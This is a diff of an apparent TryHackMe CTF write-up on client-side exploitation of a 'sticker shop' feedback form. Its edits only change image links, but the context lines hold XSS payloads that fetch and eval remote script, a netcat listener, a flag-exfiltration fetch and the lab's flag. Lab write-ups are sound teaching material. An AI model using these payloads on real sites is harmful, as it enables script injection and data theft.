@@ -10,7 +10,7 @@ image:
 ---
 
 ## Firts Let's start the machine
-![Desktop View](/assets/github/shop/start.jpg){:width="1200" heigth"630"}
+![Desktop View](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/github/shop/start.jpg?raw=true){:width="1200" heigth"630"}
 ##  The sticker shop is finally online!
 Your local sticker shop has finally developed its own webpage. They do not have too much experience regarding web development, so they decided to develop and host everything on the same computer that they use for browsing the internet and looking at customer feedback. Smart move!
 
@@ -22,11 +22,11 @@ Can you conduct any client-side exploitation in order to read the flag?
 {: .prompt-tip }
 
 `As you can see says Unauthorized`
-![Desktop View](/assets/github/shop/go.jpg){:width="1200" heigth"630"}
+![Desktop View](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/github/shop/go.jpg?raw=true){:width="1200" heigth"630"}
 
 >
 After like `15` minues looking for a directory I found one `submit_feedback` so now let's navigate to `http://machine_ip:8080/submit_feedback`
-![Desktop View](/assets/github/shop/dir.jpg)
+![Desktop View](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/github/shop/dir.jpg?raw=true)
 {: .prompt-info }
 
 >
@@ -47,7 +47,7 @@ So I set a listener on port before start the xss `8080 `
 <svg/onload='fetch("//host/a").then(r=>r.text().then(t=>eval(t)))'>
 <script src=14.rs>
 ```
-![Desktop View](/assets/github/shop/try.jpg)
+![Desktop View](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/github/shop/try.jpg?raw=true)
 
 > `nc` calls netcat
 1. `n` Avoids netcat dns resolution
@@ -69,7 +69,7 @@ So I set a listener on port before start the xss `8080 `
     });
 </script>
 ```
-![Desktop View](/assets/github/shop/flag.jpg){:width="1200" heigth"630"}
+![Desktop View](https://github.com/xFraylin/xfraylin.github.io/blob/main/assets/github/shop/flag.jpg?raw=true){:width="1200" heigth"630"}
 `THM%7B83789a69074f636f64a38879cfcabe8b62305ee6%7D`
 >
 1. `fetch('http://127.0.0.1:8080/flag.txt')` The `fetch` function is used to do a http request to a local server (Like he's on the local machine) `127.0.0.1` in the port `8080`
